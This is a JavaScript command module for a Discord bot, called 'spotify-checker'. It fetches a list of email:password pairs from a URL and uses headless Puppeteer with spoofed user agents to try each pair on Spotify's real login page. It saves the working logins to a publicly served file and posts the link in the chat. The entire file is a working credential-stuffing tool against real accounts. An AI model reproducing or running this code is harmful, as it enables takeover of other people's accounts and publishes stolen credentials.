const fs = require("fs");
const puppeteer = require("puppeteer");
const fetch = require("node-fetch");
const {
  getRootDir,
  getUserAgent,
  getRandomInt,
  ProgressText
} = require("../../utils");
const { prefix } = require("../../config");

const document = {};
const validCredentials = [];

const puppeteerOptions = {
  args: [
    "--disable-gpu",
    "--disable-dev-shm-usage",
    "--disable-setuid-sandbox",
    "--no-first-run",
    "--no-sandbox",
    "--no-zygote"
  ]
};

const getCredentials = url => fetch(url).then(res => res.text());

const saveCredentials = (filename, collections) => {
  const file = fs.createWriteStream(`${getRootDir()}/public/${filename}`);
  file.on("error", console.error);
  collections.forEach(value => file.write(`${value}\n`));
  file.end();
};

const checkCredentials = async (
  { browser, credentials, filename, message },
  index = 0
) => {
  const URL = "https://accounts.spotify.com/en/login";
  const email = credentials[index].substring(
    0,
    credentials[index].indexOf(":")
  );
  const password = credentials[index].substring(
    credentials[index].indexOf(":") + 1
  );

  message.edit(
    `Checking (${index + 1}/${
      credentials.length
    }) \`${email}\` | You can check the result at http://${
      process.env.PROJECT_DOMAIN
    }/public_file/${filename}`
  );

  try {
    if (index < credentials.length) {
      const page = await browser.newPage();

      await page.setUserAgent(getUserAgent());
      await page.goto(URL, {
        waitUntil: "networkidle0"
      });
      await page.evaluate(() => {
        document.getElementById("login-username").value = "";
      });
      await page.focus("input[id=login-username]");
      await page.keyboard.type(email);
      await page.focus("input[id=login-password]");
      await page.keyboard.type(password);
      await page.click("button[id=login-button]");
      await page.waitFor(3000);

      const isValid = await page.evaluate(() => {
        if (document.querySelector(".alert")) {
          return false;
        }

        if (document.querySelector(".user-details")) {
          document.querySelector(".btn-green").click();
          return true;
        }
      });

      if (isValid) {
        validCredentials.push(credentials[index]);
        await page.waitFor(3000);
      }

      saveCredentials(filename, validCredentials);
      await page.close();
      checkCredentials({ browser, credentials, filename, message }, index + 1);
    }
  } catch (err) {
    await browser.close();
    const newBrowser = await puppeteer.launch(puppeteerOptions);
    checkCredentials(
      { browser: newBrowser, credentials, filename, message },
      index + 1
    );
  }
};

module.exports = {
  name: "spotify-checker",
  aliases: ["sc"],
  description: "Check spotify accounts from a list",
  args: true,
  usage: `http://example.com/file.txt filename.txt`,
  devOnly: true,
  async execute(message, args) {
    const textResult = await getCredentials(args[0]);
    const credentials = textResult
      .split("\n")
      .map(cred => cred.includes("@") && cred.substring(0, cred.indexOf(" ")))
      .filter(val => !!val);

    const browser = await puppeteer.launch(puppeteerOptions);

    return message.channel
      .send(
        `Checking... You can check the result at http://${
          process.env.PROJECT_DOMAIN
        }/public_file/${args[1]}`
      )
      .then(async msg => {
        await checkCredentials({
          browser,
          credentials,
          message: msg,
          filename: args[1]
        });
      });
  }
};
